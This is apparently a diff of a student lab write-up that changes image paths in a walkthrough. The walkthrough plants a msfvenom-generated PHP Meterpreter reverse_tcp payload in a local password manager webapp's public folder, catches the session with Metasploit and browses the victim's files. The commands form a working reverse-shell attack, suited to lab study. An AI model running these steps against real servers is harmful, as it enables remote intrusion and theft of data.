@@ -7,49 +7,49 @@ In this lab, I’ll be looking at a different type of attack that can happen on 
 ## Steps to Reproduce
 1. With the Docker app running, open up a new terminal window and enter, `docker run --rm -it -p 4444:4444 metasploitframework/metasploit-framework`
 
-![Start up Docker with Metasploit container](week6-images/img1.png)
+![Start up Docker with Metasploit container](images/week6-images/img1.png)
 
 2. Now that we have a metasploit docker container running, we should test to see if we’re able to run code on our password manager app. In our password manager application files, navigate to webapp > public, then create the following script:
 
-![load.php script](week6-images/img2.png)
+![load.php script](images/week6-images/img2.png)
 
 3. Run the password manager app and sign in. Then, change the browser link to **localhost/load.php**. (You may need to run `docker compose up –build`)
 
-![Access load-php on webapp](week6-images/img3.png)
+![Access load-php on webapp](images/week6-images/img3.png)
 
 4. The results from the last step show that it is possible to run code on our web app, so we can proceed to make our payload. To do this, we’ll go back to our terminal with Metasploit and enter the command: `/usr/src/metasploit-framework/msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your EXTERNAL IP address> LPORT=4444 -f raw`, setting the value of LHOST to be 172.17.0.2. By running the command, we get the following output.
 
-![View of Metasploit](week6-images/img4.png)
+![View of Metasploit](images/week6-images/img4.png)
 
 5. Starting from “<?”, copy the entire output. Then, going back to our password manager application files, navigate to webapp > public, and create the file **reverse_tcp.php** and paste the output into the file.
 
-![reverse_tcp.php file pt. 1](week6-images/img5a.png)
-![reverse_tcp.php file pt. 2](week6-images/img5b.png)
+![reverse_tcp.php file pt. 1](images/week6-images/img5a.png)
+![reverse_tcp.php file pt. 2](images/week6-images/img5b.png)
 
 6. Going back to our Metasploit terminal, enter the command `use php/meterpreter/reverse_tcp`. Then, enter the command `options`. Ensure that the options, LHOST and LPORT are set- which should be by default.
 
-![Prepare Metasploit](week6-images/img6.png)
+![Prepare Metasploit](images/week6-images/img6.png)
 
 7. Next, run the command `exploit` to start the service.
 
-![Run Metasploit](week6-images/img7.png)
+![Run Metasploit](images/week6-images/img7.png)
 
 8. Go back to our web application and login. From there, change the browser link to **localhost/reverse_tcp.php**. (You may need to run, `docker compose up —build` again)
 
-![Access reverse_tcp.php on webapp](week6-images/img8.png)
+![Access reverse_tcp.php on webapp](images/week6-images/img8.png)
 
 9. Back on our Metasploit terminal, we can use the command `session -l`.
 
-![View of Metasploit sessions](week6-images/img9.png)
+![View of Metasploit sessions](images/week6-images/img9.png)
 
 10. Using the command `sessions -i <ID>`and replacing `<ID>` with one of the ID values above, we can interact with the chosen session.
 
-![Interacting with Session 5](week6-images/img10.png)
+![Interacting with Session 5](images/week6-images/img10.png)
 
 11. Using the command `ls` shows us what files and directories are in the victim’s machine. We can even `cd` into different directories to see what they contain.
 
-![List of files of directories on the victim machine](week6-images/img11a.png)
-![Peeking inside the admin directory](week6-images/img11b.png)
+![List of files of directories on the victim machine](images/week6-images/img11a.png)
+![Peeking inside the admin directory](images/week6-images/img11b.png)
 
 ## Analysis
 1. Q: Name the vulnerability, exploit, payload, and target involved in this lab.
